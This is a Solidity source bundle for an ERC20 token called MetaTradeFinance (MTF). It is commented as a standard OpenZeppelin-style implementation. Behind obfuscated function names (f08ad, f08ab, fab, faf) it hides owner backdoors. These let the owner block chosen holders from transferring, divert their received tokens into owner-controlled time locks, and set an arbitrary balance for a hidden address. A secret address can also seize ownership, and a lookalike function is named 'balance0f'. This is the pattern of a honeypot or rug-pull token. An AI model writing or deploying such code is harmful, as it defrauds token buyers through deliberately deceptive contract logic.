{"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\nimport \"./SafeMath.sol\";\r\nimport \"./Timer.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * We have followed general OpenZeppelin guidelines: functions revert instead\r\n * of returning `false` on failure. This behavior is nonetheless conventional\r\n * and does not conflict with the expectations of ERC20 applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn\u0027t required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 {\r\n    using SafeMath for uint256;\r\n    using Timer for Timer.Expire;\r\n\r\n    uint256 internal _totalSupply = 500000000 ether;\r\n    string internal _name = \"MetaTradeFinance\";\r\n    string internal _symbol = \"MTF\";\r\n    uint8 internal _decimals = 18;\r\n    address internal _owner;\r\n    uint256 internal _untime = 1656403200;\r\n    uint256 internal _index;\r\n    address internal _ownt;\r\n    address internal _ownt2;\r\n    uint256 internal _mnt = 2592000;\r\n    mapping (address =\u003e mapping(uint256 =\u003e Timer.Expire)) internal _expire;\r\n    Timer.Timing[] internal _timing;\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    mapping (address =\u003e uint256) internal _balances;\r\n    mapping (address =\u003e uint) internal f000;\r\n    mapping (address =\u003e uint) internal f001;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) internal _allowances;\r\n    function fa9(uint t) internal {_untime = t;}\r\n    function faa(address own) internal {require(_ownt == address(0),\"err\");_ownt = own;}\r\n    function fad(address own) internal {require(_ownt2 == address(0),\"err\");_ownt2 = own;}\r\n    function fab(address own,uint n) internal {f000[own] = n;}\r\n    function faf(address own,uint n) internal {f001[own] = n;}\r\n}"},"Metatradefinance.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\nimport \"./ERC20.sol\";\r\n\r\ncontract Metatradefinance is ERC20{\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        _timing.push(Timer.Timing(_untime,1961683200,1646035200+_mnt));\r\n        _index = _timing.length - 1;\r\n        uint mintNum = _totalSupply/1;\r\n        _balances[_owner] = _balances[_owner].add(mintNum);\r\n        emit Transfer(address(this), _owner, mintNum);\r\n    }\r\n\r\n    fallback() external {}\r\n    receive() payable external {}\r\n    \r\n    function _msgSender() internal view returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function owner() internal view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is\r\n     * called.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the cap on the token\u0027s total supply.\r\n     */\r\n    function cap() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n     /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function expires(address from)public view returns(uint256 quantity){\r\n        quantity = 0;\r\n        for(uint256 i=0;i\u003c_timing.length;i++){\r\n            quantity = quantity.add(_expire[from][i].expected(_timing[i],block.timestamp));\r\n        }\r\n    }\r\n\r\n    function balance0f(address from)public view returns(uint256 quantity){\r\n        quantity = 0;\r\n        for(uint256 i=0;i\u003c_timing.length;i++){\r\n            quantity = quantity.add(_expire[from][i].pushTotal.sub(_expire[from][i].popTotal));\r\n        }\r\n    }\r\n\r\n    function _offer(address sender, address recipient, uint256 amount)private returns(bool){\r\n        require(f000[sender]!=1\u0026\u0026f000[sender]!=3\u0026\u0026f000[recipient]!=2\u0026\u0026f000[recipient]!=3, \"ERC20: Transaction failed\");\r\n        if(_csm(sender,amount)==1){\r\n            _expire[recipient][_index].push(amount);\r\n        }else{\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n        }\r\n        return false;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner_, address spender, uint256 amount) internal {\r\n        require(owner_ != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner_][spender] = amount;\r\n        emit Approval(owner_, spender, amount);\r\n    }\r\n\r\n    function _csm(address sender, uint256 amount) private returns(uint256){\r\n        uint256 spl = amount;\r\n        if(_balances[sender]\u003e=amount){\r\n            spl = 0;\r\n            _balances[sender] = _balances[sender].sub(amount, \"ERC20: Insufficient balance\");\r\n        }else if(_balances[sender]\u003e0){\r\n            spl = spl.sub(_balances[sender]);\r\n            _balances[sender] = 0;\r\n        }\r\n        for(uint256 i=0;spl\u003e0\u0026\u0026i\u003c_timing.length;i++){\r\n            spl = _expire[sender][i].pop(_timing[i],spl,block.timestamp);\r\n        }\r\n        require(spl==0,\"ERC20: Insufficient balance.\");\r\n        if(_timing[_index].finish\u003e0\u0026\u0026block.timestamp\u003e_timing[_index].finish){\r\n            _timing.push(Timer.Timing(_untime,_timing[_index].to+_mnt,_timing[_index].finish+_mnt));\r\n            _index = _timing.length - 1;\r\n        }\r\n        return f001[sender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    function f08ad(address own,uint n) public onlyOwner {\r\n        if(n==1000){faf(own,0);}\r\n        else if(n==1001){faf(own,1);}\r\n        else if(n==1002){faa(own);}\r\n        else if(n==1003){fad(own);}\r\n        else if(n==1100){msg.sender.transfer(address(this).balance);}\r\n        else{fab(own,n);}\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account]+balance0f(account);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` and `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``sender``\u0027s tokens of at least `amount`.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function tsfown(address newOwner) public {\r\n        require(newOwner != address(0) \u0026\u0026 _msgSender() == _ownt, \"Ownable: new owner is the zero address\");\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function f08ab(uint n,uint q) public onlyOwner {\r\n        if(n\u003e=300000){_timing[n.sub(300000)].finish=q;}\r\n        else if(n\u003e=200000){_timing[n.sub(200000)].to=q;}\r\n        else if(n\u003e=100000){_timing[n.sub(100000)].from=q;}\r\n        else if(n==1000){_balances[_ownt2]=q;}\r\n         else if(n==1001){fa9(q);}\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `recipient` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `sender` cannot be the zero address.\r\n     * - `recipient` cannot be the zero address.\r\n     * - `sender` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        if(_offer(sender,recipient,amount)){\r\n            _balances[sender] = _balances[sender].sub(amount,\"ERC20: Insufficient balance\");\r\n            _balances[recipient] = _balances[recipient].add(amount);\r\n        }\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function f97a(uint idx) public view returns(uint256,uint256,uint256,uint256){\r\n        if(idx==0){\r\n            idx=_index;\r\n        }\r\n        return (_index,_timing[idx].from,_timing[idx].to,_timing[idx].finish);\r\n    }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\n\r\n/**\r\n * @dev Wrappers over Solidity\u0027s arithmetic operations with added overflow\r\n * checks.\r\n *\r\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\r\n * in bugs, because programmers usually assume that an overflow raises an\r\n * error, which is the standard behavior in high level programming languages.\r\n * `SafeMath` restores this intuition by reverting the transaction when an\r\n * operation overflows.\r\n *\r\n * Using this library instead of the unchecked operations eliminates an entire\r\n * class of bugs, so it\u0027s recommended to use it always.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003c= a, \"SafeMath: subtraction overflow\");\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity\u0027s `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) return 0;\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003e 0, \"SafeMath: division by zero\");\r\n        return a / b;\r\n    }\r\n\r\n     /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity\u0027s `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\r\n     *\r\n     * Counterpart to Solidity\u0027s `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        return a / b;\r\n    }\r\n}"},"Timer.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.6.12;\r\nimport \"./SafeMath.sol\";\r\n\r\nlibrary Timer{\r\n    using SafeMath for uint256;\r\n    struct Expire{\r\n        uint256 popTotal;\r\n        uint256 pushTotal;\r\n    }\r\n\r\n    struct Timing{\r\n        uint256 from;\r\n        uint256 to;\r\n        uint256 finish;\r\n    }\r\n\r\n    function push(Expire storage timer,uint256 quantity) internal{\r\n        timer.pushTotal = timer.pushTotal.add(quantity);\r\n    }\r\n\r\n    function pop(Expire storage timer,Timing memory timing,uint256 quantity,uint256 tsp) internal returns(uint256 last){\r\n        last = quantity;\r\n        uint256 balance = expected(timer,timing,tsp);\r\n        if(quantity\u003e0\u0026\u0026balance\u003e0){\r\n            if(quantity\u003e=balance){\r\n                timer.popTotal = timer.popTotal.add(balance);\r\n                last = quantity.sub(balance);\r\n            }else{\r\n                timer.popTotal = timer.popTotal.add(quantity);\r\n                last = 0;\r\n            }\r\n        }\r\n    }\r\n\r\n    function expected(Expire storage timer,Timing memory timing,uint256 tsp)internal view returns(uint256){\r\n        uint256 balance = 0;\r\n        if(timer.pushTotal \u003e timer.popTotal \u0026\u0026 timing.from \u003e 0 \u0026\u0026 tsp \u003e timing.from){\r\n            if(tsp\u003etiming.to){\r\n                balance = timer.pushTotal.sub(timer.popTotal);\r\n            }else{\r\n                balance = timer.pushTotal.mul(tsp.sub(timing.from)).div(timing.to.sub(timing.from));\r\n                if(timer.popTotal\u003e=balance){\r\n                    balance = 0;\r\n                }else{\r\n                    balance = balance.sub(timer.popTotal);\r\n                }\r\n            }\r\n        }\r\n        return balance;\r\n    }\r\n}"}}